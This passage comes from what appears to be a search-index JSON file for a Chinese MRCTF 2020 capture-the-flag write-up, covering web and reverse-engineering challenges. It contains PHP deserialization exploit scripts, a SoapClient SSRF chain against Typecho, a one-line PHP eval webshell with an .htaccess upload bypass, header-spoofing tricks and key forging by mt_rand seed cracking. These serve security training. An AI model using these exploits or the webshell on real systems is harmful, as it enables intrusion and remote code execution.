\u7ed9\u51fak=2,n=19260817","title":"\u5c0fO\u7684\u8003\u7814\u590d\u8bd5\u3002"},{"location":"writeup/MRCTF-2020/#_6","text":"\u8003\u8651wolf alpha\u76f4\u63a5\u51fa\u3002","title":"\u7b2c\u4e00\u79cd"},{"location":"writeup/MRCTF-2020/#_7","text":"\u5feb\u901f\u5e42+\u4e58\u6cd5\u9006\u5143 \uff08ksm(10,n)-1\uff09*(ksm(9,mod-2)*n)","title":"\u7b2c\u4e8c\u79cd"},{"location":"writeup/MRCTF-2020/#_8","text":"\u6838\u5fc3\u4ee3\u7801 for(int i=0;i<19260817;i++) { a=(a*10+2)%mod; }","title":"\u7b2c\u4e09\u79cd"},{"location":"writeup/MRCTF-2020/#web","text":"","title":"Web"},{"location":"writeup/MRCTF-2020/#not-so-web-application","text":"\u9996\u5148\u662f\u9898\u76ee\u8bf4\u660e\uff0c\u8fd9\u73a9\u610f\u672c\u6765\u6ca1\u8fd9\u4e48\u6076\u5fc3\uff08\u6ca1\u4f2a\u88c5\u52a0\u4e0a User \u548c SQL \u90a3\u4e2a SVG\uff09 \u672c\u9898\u4e3b\u8981\u96be\u70b9\u5728\u4e8e Web Assembly \u81f3\u4eca\u6ca1\u6709\u4e2a\u80fd\u7528\u7684\u8c03\u8bd5\u5668\uff08\u53ef\u80fd\u4e0b\u8f88\u5b50\u4e5f\u6ca1\u6709\u80fd\u7528\u7684\uff09\uff0c \u6240\u4ee5\u9700\u8981\u591a\u79cd\u624b\u6bb5\u52a8\u8c03+\u9759\u6001\u8c03\u8bd5\u3002 \u53ef\u4ee5\u5148\u901a\u8fc7\u548c\u5176\u4ed6 Qt for Web Assembly \u7a0b\u5e8f\u6bd4\u5bf9\uff0c\u53bb\u6389\u4e00\u5927\u534a\u7591\u4f3c\u51fd\u6570\uff0c\u540c\u65f6 \u53ef\u4ee5\u901a\u8fc7\u641c\u7d22\u5b57\u7b26\u4e32\uff08Incorrect\u7b49\uff09\u786e\u5b9a\u5927\u6982\u76f8\u5173\u51fd\u6570\u4f4d\u7f6e\u3002 \u540c\u65f6\u901a\u8fc7\u7ed9\u8f93\u5165\u6846\u585e\u5165\u5927\u91cf\u5783\u573e\uff08>64KB\uff0cwasm\u57fa\u672c\u5185 \u5b58\u5355\u4f4d\uff09\u89e6\u53d1\u5185\u5b58\u8d8a\u754c\u9519\u8bef\u627e\u5230\u53d8\u91cf\u5b58\u50a8\u4f4d\u7f6e\u3002\u6700\u7ec8\u5728\u6d4f\u89c8\u5668\u91cc\u52a8\u8c03\u548c wasm2c \u7684\u8f85\u52a9\u53ef\u4ee5\u627e\u5230flag\u52a0\u5bc6\u540e\u5185\u5bb9\u548c\u6bd4\u5bf9 \u7b97\u6cd5 \u53ef\u4ee5\u770b\u4e0b\u4e4b\u524d\u5927\u4f6c\u53d1\u7684\u6587\u7ae0 \u63a8\u8350\u9605\u8bfb https://processor.pub/2018/12/23/WASM%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E9%97%AE%E9%A2%98/","title":"Not So Web Application"},{"location":"writeup/MRCTF-2020/#pywebsite","text":"\u4e00\u9053\u7b80\u5355\u7684\u524d\u7aeftrick\u9898\u76ee\uff0c\u5e0c\u671b\u66f4\u591a\u4eba\u6ce8\u610f\u5230\u524d\u7aef\u9a8c\u8bc1\u662f\u4e0d\u5b89\u5168\u7684\u3002 \u9996\u5148\u8fc7\u4e00\u904d\u4e1a\u52a1\u903b\u8f91\uff0c\u662f\u8d2d\u4e70\u6388\u6743\u7801\uff0c\u518d\u9a8c\u8bc1\u6388\u6743\u7801\u7684\u8fc7\u7a0b\u3002\u81ea\u7136\u60f3\u5230\u5ba1\u8ba1\u9a8c\u8bc1\u8fc7\u7a0b\u7684\u6f0f\u6d1e\u3002\u70b9\u51fb\u6309\u94ae\u5f39\u51fa\u7a97\u53e3\u662fjs\u63a7\u5236\u7684\uff0c\u8fdb\u800c\u731c\u6d4b\u9a8c\u8bc1\u903b\u8f91\u5904\u4e8e\u524d\u7aef\uff0c\u4e8e\u662f\u67e5\u770b\u6e90\u4ee3\u7801\u53d1\u73b0\u903b\u8f91\u5982\u4e0b: \u4e0d\u77e5\u9053MD5\uff1f\u4e8b\u5b9e\u4e0a\u6211\u4eec\u6839\u672c\u4e0d\u9700\u8981\u7406\u4f1a\u524d\u7aef\u7684\u9a8c\u8bc1\uff0c\u53ea\u9700\u8981\u76f4\u63a5\u8df3\u8f6c\u5230flag.php\u5373\u53ef\u3002 \uff08md5(\"ARandomString\")\uff09 \u8fdb\u5165flag.php\uff0c\u9898\u76ee\u544a\u8bc9\u6211\u4eec\u53ea\u6709\u7279\u5b9a\u7684IP\u624d\u80fd\u8bbf\u95ee\uff0c\u5e76\u4e14\u662f\u540e\u7aef\u9a8c\u8bc1\u3002\u4e8b\u5b9e\u4e0a\uff0c\u5e94\u7528\u5c42\u4f7f\u7528XFF\u9a8c\u8bc1IP\u4e5f\u662f\u6ca1\u6709\u610f\u4e49\u7684\u3002PHP\u4f7f\u7528X-Forward-For\u8fd9\u4e2ahttp\u7684\u8bf7\u6c42\u5934\u6765\u9a8c\u8bc1\uff0c\u800c\u8fd9\u4e2a\u8bf7\u6c42\u5934\u6211\u4eec\u53ef\u4ee5\u4f2a\u9020\u3002 \u6211\u4eec\u4e0d\u77e5\u9053\u8d2d\u4e70\u8005\u7684IP\uff0c\u4f46\u662f\u77e5\u9053\u201c\u81ea\u5df1\u201d\u7684IP\uff0c\u4e5f\u5c31\u662f\u672c\u5730\u73af\u56de\u5730\u5740 127.0.0.1 \u3002\u56e0\u6b64\u53ea\u9700\u8981\u7528\u6293\u5305\u8f6f\u4ef6\u6293\u5230HTTP\u7684\u8bf7\u6c42\u5305\uff0c\u8fdb\u884c\u4fee\u6539\uff08\u52a0\u5165 X-Forwarded-For: 127.0.0.1 \u4e00\u884c\uff09\u5c31\u53ef\u4ee5\u6b3a\u9a97\u8fc7\u9a8c\u8bc1\u903b\u8f91\u3002 \u6700\u540e\u7684flag\u5b57\u4f53\u6211\u8c03\u6210\u4e86\u767d\u8272hhh \u6240\u4ee5\u8981\u591a\u89c2\u5bdf\u6e90\u4ee3\u7801 \u540e\u7aef\u7684\u9a8c\u8bc1\u903b\u8f91\u4e00\u822c\u5982\u4e0b\uff1a function checkXFF() { if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])) { $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; if (strpos($ip, \"127.0.0.1\") !== false) { return true; } } return false; } \u987a\u4fbf\u4e00\u63d0\uff0c\u5982\u4f55\u9a8c\u8bc1\u7528\u6237\u7684\u771f\u5b9eIP\u5462\uff1f\u786e\u5b9e\u4e0d\u597d\u529e\u3002\u56e0\u4e3a\u7528\u6237\u53ef\u80fd\u4f7f\u7528\u4ee3\u7406\uff08\u79f0\u4e3a\u6b63\u5411\u4ee3\u7406\uff09\uff0c\u6211\u4eec\u7684\u670d\u52a1\u5668\u56e0\u4e3a\u4e1a\u52a1\u9700\u6c42\uff0c\u4e5f\u4f1a\u8fdb\u884c\u8d1f\u8f7d\u5747\u8861\u7b49\u8f6c\u53d1\u64cd\u4f5c\uff08\u79f0\u4e3a\u53cd\u5411\u4ee3\u7406\uff09\u3002\u4f46\u5982\u679c\u8fd9\u4e2a\u8fc7\u7a0b\u6ca1\u6709\u7ecf\u8fc7\u4ee3\u7406\uff0c\u4e00\u822c\u4f7f\u7528Remote_Addr\u662f\u53ef\u4ee5\u83b7\u5f97\u771f\u5b9eIP\u7684\u3002 flag: MRCTF{Ba1_Pia0_Flag_1s_ve7y_H4PPY!}","title":"PYWebsite"},{"location":"writeup/MRCTF-2020/#ez_bypass","text":"\u5f88\u7b80\u5355\u7684bypass \u7b2c\u4e00\u6b65md5\u597d\u591a\u79cd\u7ed5\u8fc7\u65b9\u6cd5\u3002 \u53ef\u4ee5\u5f53\u6570\u7ec4\uff0c\u53ef\u4ee5\u5f53md5\u78b0\u649e\uff0c\u53ef\u4ee5\u6784\u90200e\u5f00\u5934\u79d1\u5b66\u8ba1\u6570\u6cd5\u3002 \u7b2c\u4e8c\u6b65\u7528\u8bed\u53e5\u7ed5\u8fc7 1234567|1=1 \u5373\u53ef\u5f97\u5230flag \u6bd4\u8f83\u7b80\u5355","title":"Ez_bypass"},{"location":"writeup/MRCTF-2020/#ezpop","text":"\u4e3b\u8981\u8003\u5bdf\u5bf9php\u9b54\u672f\u5316\u65b9\u6cd5\u7684\u4e86\u89e3 \u63d0\u793a\u91cc\u6709\u53c2\u8003\u8d44\u6599\uff0c\u4e5f\u662f\u4e3a\u4e86\u953b\u70bc\u8d5b\u573a\u4e0a\u7684\u81ea\u5b66\u80fd\u529b\u5427 \u8003\u70b9\u5c31\u8fd9\u4e09\u4e2a","title":"EzPop"},{"location":"writeup/MRCTF-2020/#_9","text":"__construct()//\u5f53\u4e00\u4e2a\u5bf9\u8c61\u521b\u5efa\u65f6\u88ab\u8c03\u7528 __destruct() //\u5f53\u4e00\u4e2a\u5bf9\u8c61\u9500\u6bc1\u65f6\u88ab\u8c03\u7528 __toString() //\u5f53\u4e00\u4e2a\u5bf9\u8c61\u88ab\u5f53\u4f5c\u4e00\u4e2a\u5b57\u7b26\u4e32\u4f7f\u7528 __sleep()//\u5728\u5bf9\u8c61\u5728\u88ab\u5e8f\u5217\u5316\u4e4b\u524d\u8fd0\u884c __wakeup()//\u5c06\u5728\u53cd\u5e8f\u5217\u5316\u4e4b\u540e\u7acb\u5373\u88ab\u8c03\u7528(\u901a\u8fc7\u5e8f\u5217\u5316\u5bf9\u8c61\u5143\u7d20\u4e2a\u6570\u4e0d\u7b26\u6765\u7ed5\u8fc7) __get()//\u83b7\u5f97\u4e00\u4e2a\u7c7b\u7684\u6210\u5458\u53d8\u91cf\u65f6\u8c03\u7528 __set()//\u8bbe\u7f6e\u4e00\u4e2a\u7c7b\u7684\u6210\u5458\u53d8\u91cf\u65f6\u8c03\u7528 __invoke()//\u8c03\u7528\u51fd\u6570\u7684\u65b9\u5f0f\u8c03\u7528\u4e00\u4e2a\u5bf9\u8c61\u65f6\u7684\u56de\u5e94\u65b9\u6cd5 __call()//\u5f53\u8c03\u7528\u4e00\u4e2a\u5bf9\u8c61\u4e2d\u7684\u4e0d\u80fd\u7528\u7684\u65b9\u6cd5\u7684\u65f6\u5019\u5c31\u4f1a\u6267\u884c\u8fd9\u4e2a\u51fd\u6570","title":"\u53cd\u5e8f\u5217\u5316\u9b54\u672f\u65b9\u6cd5"},{"location":"writeup/MRCTF-2020/#publicprotectedprivate","text":"protected \u58f0\u660e\u7684\u5b57\u6bb5\u4e3a\u4fdd\u62a4\u5b57\u6bb5\uff0c\u5728\u6240\u58f0\u660e\u7684\u7c7b\u548c\u8be5\u7c7b\u7684\u5b50\u7c7b\u4e2d\u53ef\u89c1\uff0c\u4f46\u5728\u8be5\u7c7b\u7684\u5bf9\u8c61\u5b9e\u4f8b\u4e2d\u4e0d\u53ef\u89c1\u3002\u56e0\u6b64\u4fdd\u62a4\u5b57\u6bb5\u7684\u5b57\u6bb5\u540d\u5728\u5e8f\u5217\u5316\u65f6\uff0c\u5b57\u6bb5\u540d\u524d\u9762\u4f1a\u52a0\u4e0a\\0 \\0\u7684\u524d\u7f00\u3002\u8fd9\u91cc\u7684 \\0 \u8868\u793a ASCII \u7801\u4e3a 0 \u7684\u5b57\u7b26(\u4e0d\u53ef\u89c1\u5b57\u7b26)\uff0c\u800c\u4e0d\u662f \\0 \u7ec4\u5408\u3002\u8fd9\u4e5f\u8bb8\u89e3\u91ca\u4e86\uff0c\u4e3a\u4ec0\u4e48\u5982\u679c\u76f4\u63a5\u5728\u7f51\u5740\u4e0a\uff0c\u4f20\u9012\\0 \\0username\u4f1a\u62a5\u9519\uff0c\u56e0\u4e3a\u5b9e\u9645\u4e0a\u5e76\u4e0d\u662f\\0\uff0c\u53ea\u662f\u7528\u5b83\u6765\u4ee3\u66ffASCII\u503c\u4e3a0\u7684\u5b57\u7b26\u3002\u5fc5\u987b\u7528python\u4f20\u503c\u624d\u53ef\u4ee5\u3002","title":"public\u3001protected\u4e0eprivate\u5728\u5e8f\u5217\u5316\u65f6\u7684\u533a\u522b"},{"location":"writeup/MRCTF-2020/#base64-wrapper-lfi","text":"php://filter/convert.base64-encode/resource=flag.php Exp: <?php class Show{ public $source; public $str; } class Test{ public $p; } class Modifier{ protected $var; function __construct(){ $this->var=\"php://filter/convert.base64-encode/resource=flag.php\"; } } $s = new Show(); $t = new Test(); $r = new Modifier(); $t->p = $r; $s->str = $t; $s->source = $s; var_dump(urlencode(serialize($s))); ?> \u5206\u6790\uff1a <?php //flag is in flag.php //WTF IS THIS? //Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95 //And Crack It! class Modifier { protected $var; public function append($value){ include($value);//8.\u89e6\u53d1\u8fd9\u4e2ainclude\uff0c\u5229\u7528php base64 wrapper \u8bfbflag } public function __invoke(){ $this->append($this->var);//7.\u7136\u540e\u4f1a\u8c03\u7528\u5230\u8fd9\u91cc } } class Show{ public $source; public $str; public function __construct($file='index.php'){ $this->source = $file; echo 'Welcome to '.$this->source.\"<br>\"; } public function __toString(){ return $this->str->source;//4.\u8fd9\u91cc\u4f1a\u8c03\u7528str->source\u7684__get \u90a3\u4e48\u6211\u4eec\u5c06\u5176\u8bbe\u7f6e\u4e3aTest\u5bf9\u8c61 } public function __wakeup(){//2.\u5982\u679cpop\u662f\u4e2aShow,\u90a3\u4e48\u8c03\u7528\u8fd9\u91cc if(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this->source)) {//3.\u5339\u914d\u7684\u65f6\u5019\u4f1a\u8c03\u7528__toString echo \"hacker\"; $this->source = \"index.php\"; } } } class Test{ public $p; public function __construct(){ $this->p = array(); } public function __get($key){ $function = $this->p;//5.\u89e6\u53d1\u5230\u8fd9\u91cc return $function();//6.()\u4f1a\u8c03\u7528__invoke,\u6211\u4eec\u8fd9\u91cc\u9009\u62e9Modifier\u5bf9\u8c61 } } if(isset($_GET['pop'])){ @unserialize($_GET['pop']);//1.\u53cd\u5e8f\u5217\u8c03\u7528\u8fd9\u91cc } else{ $a=new Show; highlight_file(__FILE__); } \u6784\u9020\u5373\u53ef","title":"BASE64 Wrapper LFI"},{"location":"writeup/MRCTF-2020/#_10","text":"\u5728URL\u4e2dGET\u8bf7\u6c42\u5f53\u8f93\u5165 . \u6216\u8005 (\u7a7a\u683c)\u6216\u8005 _ \u90fd\u4f1a\u5ffd\u7565\uff0c\u56e0\u6b64 b_u_p_t ,\u5176\u5b9e\u5c31\u662f b u p t ,\u6b63\u5219\u7684\u610f\u601d\u662f\u5fc5\u987b\u898123333\u5f00\u5934\u548c\u7ed3\u5c3e\uff0c\u4f46\u662f\u503c\u4e0d\u80fd\u4e3a23333\uff0c\u8fd9\u4e2a\u65f6\u5019url\u7684%0A\u4e3a\u6362\u884c\u6c61\u67d3\uff0c\u53ef\u4ee5\u7ed5\u8fc7\u6b63\u5219\uff0c\u4e14\u503c\u4e0d\u4e3a23333\u3002\u76f4\u63a5\u8fdb\u5165\u4e0b\u4e00\u4e2a\u5957\u5a03\u3002jsfuck\u5728\u63a7\u5236\u5668\u8f93\u51fa\u53d1\u73b0POST Merak\u3002Post Merak=1\u5373\u53ef\u67e5\u770b\u6e90\u7801\u3002\u5224\u65ad\u610f\u56fe\u662f\u6a21\u62df\u672c\u5730\u7528\u6237\uff0c\u8fd9\u91cc\u6211\u7981\u4e86XFF\u5934\uff0c\u53ef\u4ee5\u7528Client-ip\u8fdb\u884c\u7ed5\u8fc7\u5373\u53ef\uff0c\u6700\u540e file_get_contents \u9700\u8981\u89e3\u5bc6\uff0cexp\u5982\u4e0b <?php function decode($v){ $v = base64_decode($v); $re = ''; for($i=0;$i<strlen($v);$i++){ $re .= chr ( ord ($v[$i]) + $i*2 ); } return $re; } function en_code($value){ $result = ''; for($i=0;$i<strlen($value);$i++){ $result .= chr(ord($value[$i]) - $i*2); } $result = base64_encode($result); return $result; } echo en_code(\"flag.php\"); ?>","title":"\u5957\u5a03"},{"location":"writeup/MRCTF-2020/#ezaudit","text":"index\u9875\u9762\u662f\u4e00\u4e2a\u5565\u4e5f\u6ca1\u7528\u7684\u9875\u9762\uff0c\u9700\u8981\u626b\u540e\u53f0\uff0c\u53d1\u73b0\u5b58\u5728login.php\u4e3a\u7a7a\uff0c\u8003\u8651\u5230\u53ef\u80fd\u662f\u5904\u7406\u540e\u7aef,\u524d\u7aef\u5219\u662f login.html ,\u53d1\u73b0\u662f\u4e00\u4e2a\u7b80\u5355\u7684\u767b\u5f55\u6846\uff0c\u53ea\u6709\u767b\u5f55\u6846\u60f3\u5230\u5927\u6982\u7387\u5b58\u5728\u6e90\u7801\u6cc4\u9732\uff0c\u53d1\u73b0 www.zip \u6587\u4ef6\uff0c\u5224\u65ad\u767b\u5f55\u903b\u8f91\u662fsql\u67e5\u8be2\uff0c\u6ca1\u6709\u4efb\u4f55\u8fc7\u6ee4\uff0c\u53ef\u4ee5\u76f4\u63a5\u4e07\u80fd\u5bc6\u7801\uff0c\u8fd8\u9700\u8981\u8f93\u5165\u5bc6\u94a5\uff0c\u8fd9\u91cc\u4ea7\u751f\u516c\u94a5\u548c\u79d8\u94a5\u7684\u673a\u5236\u90fd\u662f\u4f7f\u7528mt_rand\uff0c\u800c\u8fd9\u662f\u4e2a\u4f2a\u968f\u673a\u6570\uff0c\u53ef\u4ee5\u8fdb\u884c\u7834\u89e3\uff0c\u77e5\u9053\u516c\u94a5\u540e\u5c06\u516c\u94a5\u8f6c\u5316\u6210 php_mt_seed \u683c\u5f0f\uff0c gayhub \u76f4\u63a5git clone\uff0c\u5f97\u5230\u79cd\u5b50\u540e\uff0c\u518d\u5c06\u5176\u751f\u621012\u4f4d\u5bc6\u94a5\u5373\u53ef\uff0c\u5177\u4f53\u539f\u7406:https://blog.csdn.net/crisprx/article/details/104306971 exp: <?php $str = \"KVQP0LdJKRaV3n9D\"; $randStr = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\"; for($i=0;$i<strlen($str);$i++){ $pos = strpos($randStr,$str[$i]); echo $pos.\" \".$pos.\" \".\"0 \".(strlen($randStr)-1).\" \"; //\u6574\u7406\u6210\u65b9\u4fbf php_mt_seed \u6d4b\u8bd5\u7684\u683c\u5f0f //php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]] } echo \"\\n\"; /** *\u7206\u7834\u5f97\u5230mt_srand = 1775196155 */ mt_srand(1775196155); function public_key($length = 16) { $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; $public_key = ''; for ( $i = 0; $i < $length; $i++ ) $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1); return $public_key; } /** * \u5148\u751f\u6210\u4e00\u6b21\u516c\u94a5\u5728\u751f\u6210\u4e00\u6b21\u5bc6\u94a5 XuNhoueCDCGc */ function private_key($length = 12) { $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; $private_key = ''; for ( $i = 0; $i < $length; $i++ ) $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1); return $private_key; } echo public_key(); echo \"\\n\"; echo private_key(); ?>","title":"Ezaudit"},{"location":"writeup/MRCTF-2020/#_11","text":"\u5f88\u7ecf\u5178\u7684\u4e0a\u4f20\u7ed5\u8fc7\uff0c\u4e3b\u8981\u8003\u5bdf\u4e00\u4e0b\u57fa\u672c\u7684\u4e0a\u4f20\u7ed5\u8fc7\u6280\u80fd \u5229\u7528BurpSuite\u4fee\u6539MIME\u6b3a\u9a97\u540e\u7aef\u6587\u4ef6\u7c7b\u578b \u4fee\u6539 Content-Type: image/png \u7136\u540e\u5c31\u53ef\u4ee5\u4f20\u4efb\u610f\u6587\u4ef6\u540e\u7f00 \u5229\u7528.htaccess\u6765\u5236\u4f5c\u56fe\u7247\u9a6c \u589e\u52a0\u4f7f\u7528php\u89e3\u6790\u7684\u6587\u4ef6\u540e\u7f00(.jpg) AddType application/x-httpd-php .jpg \u7136\u540e\u518d\u5199\u4e2a\u4e00\u53e5\u8bdd <?php eval($_REQUEST['eki']);?> \u7528\u8681\u5251\u8fde\u4e0a\u5c31\u53ef\u4ee5\u4e86","title":"\u4f60\u4f20\u4f60\ud83d\udc0e\u5462"},{"location":"writeup/MRCTF-2020/#ezpop-revenge","text":"\u4e3b\u8981\u8003\u5bdfCMS\u5ba1\u8ba1\u80fd\u529b\u548cSSRF\u7684\u5e94\u7528 \u987a\u7740Typecho\u7684\u6e90\u7801\u641e\u7684 \u4eceGithub\u4e0a\u514b\u9686\u6e90\u7801\uff0c\u53d1\u73b01.2\u9884\u89c8\u7248\u8fd8\u67091.1\u7684POP\u94fe \u6539\u9020\u4e86\u4e00\u4e0b\u5165\u53e3,\u7136\u540e\u5957\u4e86SoapClient\u6765SSRF \u5165\u53e3\u70b9 //HelloWorld/Plugin.php if (isset($_POST['C0incid3nc3'])) { if(preg_match(\"/file|assert|eval|op|sy|exec|dl|ini|pass|scan|log|[`\\'~^?<>$%]+/i\",base64_decode($_POST['C0incid3nc3'])) === 0) unserialize(base64_decode($_POST['C0incid3nc3'])); else { echo \"Not that easy.\"; } //call_user_func(\"call_user_func\",array($a,\"233\")); } class HelloWorld_DB{ private $flag=\"MRCTF{this_is_a_fake_flag}\"; private $coincidence; function __wakeup(){ $db = new Typecho_Db($this->coincidence['hello'], $this->coincidence['world']); } } \u8def\u7531\u70b9 //Typecho/Plugin.php Helper::addRoute(\"page_admin_action\",\"/page_admin\",\"HelloWorld_Plugin\",'action'); Pop\u94fe\u53ef\u4ee5\u53c2\u7167Exp: <?php class HelloWorld_DB{ private $flag=\"MRCTF{this_is_a_fake_flag}\"; private $coincidence; function __construct($coincidence){ $this->coincidence = $coincidence; } function __wakeup(){ $db = new Typecho_Db($this->coincidence['hello'], $this->coincidence['world']); } } class Typecho_Request{ private $_params; private $_filter; function __construct($params,$filter){ $this->_params=$params; $this->_filter=$filter; } } class Typecho_Feed{ private $_type = 'ATOM 1.0'; private $_charset = 'UTF-8'; private $_lang = 'zh'; private $_items = array(); public function addItem(array $item){ $this->_items[] = $item; } } $target = \"http://127.0.0.1/flag.php\"; $post_string = ''; $headers = array( 'X-Forwarded-For: 127.0.0.1', 'Cookie: PHPSESSID=m6o9n632iub7u2vdv0pepcrbj2' ); $a = new SoapClient(null,array('location' => $target, 'user_agent'=>\"eki\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\n\".join(\"\\r\\n\",$headers).\"\\r\\nContent-Length: \".(string)strlen($post_string).\"\\r\\n\\r\\n\".$post_string, 'uri' => \"aaab\")); $payload1 = new Typecho_Request(array('screenName'=>array($a,\"233\")),array('call_user_func')); $payload2 = new Typecho_Feed(); $payload2->addItem(array('author' => $payload1)); $exp1 = array('hello' => $payload2, 'world' => 'typecho'); $exp = new HelloWorld_DB($exp1); echo serialize($exp).\"\\n\"; echo urlencode(base64_encode(serialize($exp))); \u53ef\u4ee5\u5206\u6790\u5185\u7f51\u5730\u5740 <?php if(!isset($_SESSION)) session_start(); if($_SERVER['REMOTE_ADDR']===\"127.0.0.1\"){ $_SESSION['flag']= \"MRCTF{Cr4zy_P0p_4nd_RCE}\"; }else echo \"\u6211\u624cyour problem?\\nonly localhost can get flag!\"; ?> \u8fd9\u4e5f\u662f\u4e3a\u5565cookie\u8981\u5e26session \u7528payload\u6253\u4e00\u6b21\u5237\u65b0\u4e0b\u9875\u9762var_dump()\u5c31\u4f1adumpflag\u51fa\u6765\u4e86","title":"Ezpop Revenge"},{"location":"writeup/MRCTF-2020/#re","text":"","title":"RE"},{"location":"writeup/MRCTF-2020/#xor","text":"\u5f02\u6216\u4e00\u6b21\u540e\u7684\u6570\u636e\u518d\u5f02\u6216\u4e00\u6b21\u5373\u53ef\u5f97\u5230\u539f\u6570\u636e \u5c06\u8f93\u5165\u5b57\u7b26\u548c\u5e8f\u53f7\u8fdb\u884c\u5f02\u6216\uff0c\u518d\u4e0e\u76ee\u6807\u6570\u7ec4\u6bd4\u8f83 \u6240\u4ee5\u53ea\u9700\u8981\u5c06\u76ee\u6807\u6570\u7ec4\u53cd\u8fc7\u6765\u518d\u6b21\u5f02\u6216\u5c31\u53ef\u4ee5\u5f97\u5230flag #include<cstdio> #include<cstring> #include<cstdlib> char flag[100]={0x4D,0x53,0x41,0x57,0x42,0x7E,0x46,0x58,0x5A,0x3A,0x4A,0x3A,0x60,0x74,0x51,0x4A,0x22,0x4E,0x40,0x20,0x62,0x70,0x64,0x64,0x7D,0x38,0x67}; int main() { for(int i=0;i<strlen(flag);i++) { unsigned char tmp=flag[i]; tmp^=i; printf(\"%c\",tmp); } return 0; } \u5f97\u5230flag:MRCTF{@_R3@1ly_E2_R3verse!}","title":"Xor(\u6821\u5185\u4e13\u4f9b)"},{"location":"writeup/MRCTF-2020/#transform","text":"\u5176\u5b9e\u5c31\u662f\u4e2a\u7b80\u5355\u7684\u5b57\u7b26\u7f6e\u6362\uff0c\u53ef\u4ee5\u8bd5\u8bd5\u8f93\u5165\u6709\u89c4\u5f8b\u7684\u5b57\u7b26\u4e32\uff0c\u7136\u540edump\u51fa\u5904\u7406\u8fc7\u540e\u7684\u5b57\u7b26\u4e32 \u8fd9\u6837\u5c31\u77e5\u9053\u7f6e\u6362\u77e9\u9635\u4e86\uff0c\u62ff\u51fa\u6570\u636e\u7f6e\u6362\u4e00\u4e0b\uff0c\u5f02\u6216\u4e00\u4e0b\u5c31\u662fflag\u3002\u3002","title":"Transform"},{"location":"writeup/MRCTF-2020/#_12","text":"\u8fd9\u9053\u9898\u76ee\u5176\u5b9e\u9898\u76ee\u540d\u6709\u5f88\u5927\u7684\u63d0\u793a\uff0clua lu \u8fd9\u4e2a\u4f7f\u7528C++\u5185\u5d4clua\u5199\u7684\uff0c\u4e0d\u7136\u4e3a\u4ec0\u4e48\u4f1a\u663e\u793a\"I need My friend to help me check your flag!\" \u53ea\u9700\u8981\u6839\u636e\u5224\u65ad\u903b\u8f91\u9006\u5411\u601d\u8003\uff0c\u53ef\u4ee5\u770b\u51fasub_7FF650AFD980\u662f\u4e2a\u5f88\u91cd\u8981\u7684\u51fd\u6570 \u7136\u540e\u89c2\u5bdf\u5b83\u7684\u53c2\u6570\uff0c\u53d1\u73b0\u51fa\u5165\u4e86\u4e00\u4e2a\u4e71\u4e03\u516b\u7cdf\u7684\u5b57\u7b26\u4e32\u3002 \u770b\u4e0d\u51fa\u6765\u662f\u5565\uff0c\u4f46\u662f\u5982\u679c\u52a8\u8c03\uff0c\u5c31\u4f1a\u53d1\u73b0\u8fd9\u4e2a\u5b57\u7b26\u4e32\u88ab\u4fee\u6539\u4e86\uff0c\u770b\u7684\u61c2\u4e86 cmps={83,80,73,80,76,125,61,96,107,85,62,63,121,122,101,33,123,82,101,114,54,100,101,97,85,111,39,97} print(\"Give Me Your Flag LOL!:\") flag=io.read() if string.len(flag)~=29 then print(\"Wrong flag!\") os.exit() end for i=1,string.len(flag) do local x=string.byte(flag,i) if i%2==0 then x=x~i else x=x+6 end if x~=cmps[i] then print(\"Wrong flag!\") os.exit() end end print(\"Right flag!\") os.exit() \u8fd9\u91cc\u7684~\u662f\u5f02\u6216\u7684\u610f\u601d\uff0c\u5c31\u5f88\u5bb9\u6613\u770b\u61c2\u4e86 EXP a=[83,80,73,80,76,125,61,96,107,85,62,63,121,122,101,33,123,82,101,114,54,100,101,97,85,111,39,97] flag=\"\" for i in range(1,29): x=a[i-1] if i%2==0: x^=i else: x-=6 flag+=chr(x) print flag","title":"\u64b8\u554a\u64b8"},{"location":"writeup/MRCTF-2020/#hello_world_go","text":"Golang\u9006\u5411 Golang\u7a0b\u5e8f\u53bb\u6389\u7b26\u53f7\u53ef\u4ee5\u8fd8\u539f\uff0cida\u4e0b\u6709\u811a\u672c IDAGolangHelper \u5e2e\u52a9\u6062\u590d\u7b26\u53f7\uff0c\u8fd0\u884c\u811a\u672c\u540e\u4ece\u4e0a\u5230\u4e0b\u70b9\u4e00\u904d\u6309\u94ae\u5c31\u8fd8\u539f\u4e862333 \u63a5\u4e0b\u6765\u5206\u6790\u7a0b\u5e8f\u903b\u8f91 \u53d1\u73b0\u5b57\u7b26\u4e32\u6bd4\u8f83\uff0c\u70b9\u8fdb\u53bb\u770b\u770b","title":"hello_world_go"},{"location":"writeup/MRCTF-2020/#hard_to_go","text":"\u540c\u6837\u662fGolang\u9006\u5411 \u7531\u4e0a\u53ef\u7ee7\u7eed\u6062\u590d\u7b26\u53f7 \u5176\u5b9e\u5bf9\u4e8e\u9006\u5411golang\uff0c\u6709\u7684\u65f6\u5019\u4e0d\u80fd\u7eaf\u7528F5\u6765\u770b\u7a0b\u5e8f\u903b\u8f91\uff0c\u5c24\u5176\u4f20\u53c2\uff0c\u901a\u8fc7\u6c47\u7f16\u770b\u4f1a\u66f4\u597d\u7406\u89e3 \u8fd9\u91cc\u6211\u5bf9\u7740\u6e90\u7801\u8bb2\u89e3\u4e00\u4e0b\uff0c\u5728\u6bd4\u8d5b\u4e2d\u5927\u5bb6\u4e5f\u53ef\u4ee5\u901a\u8fc7\u81ea\u5df1\u7f16\u8bd1\u76f8\u4f3c\u67b6\u6784\u7684\u76ee\u6807\u7a0b\u5e8f\u6765\u5206\u6790\u3002 NewCipher\u4f20\u53c2 move\u51fd\u6570\u4f20\u53c2 